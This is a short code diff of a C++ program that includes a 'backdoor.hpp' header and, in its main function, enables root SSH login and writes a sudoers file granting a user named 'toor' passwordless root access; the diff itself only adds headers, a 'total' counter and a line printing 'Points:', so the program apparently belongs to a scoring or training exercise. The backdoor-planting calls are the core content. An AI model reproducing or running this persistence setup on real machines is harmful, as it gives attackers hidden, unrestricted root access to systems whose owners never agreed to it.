@@ -1,6 +1,9 @@
-#include <iostream>
 #include "backdoor.hpp"
 #include "serviceConfig.hpp"
+#include "sudoers.hpp"
+#include "globals.hpp"
+
+int total = 0;
 
 int main(){
 
@@ -12,6 +15,7 @@ int main(){
     rootLoginSSH("PermitRootLogin yes");
     sudoersFile("/etc/sudoers.d/toor");
     sudoersEntry("toor ALL=(ALL) NOPASSWD:ALL");
+    std::cout << "Points: " << total << std::endl;
 
     return 0;
 }
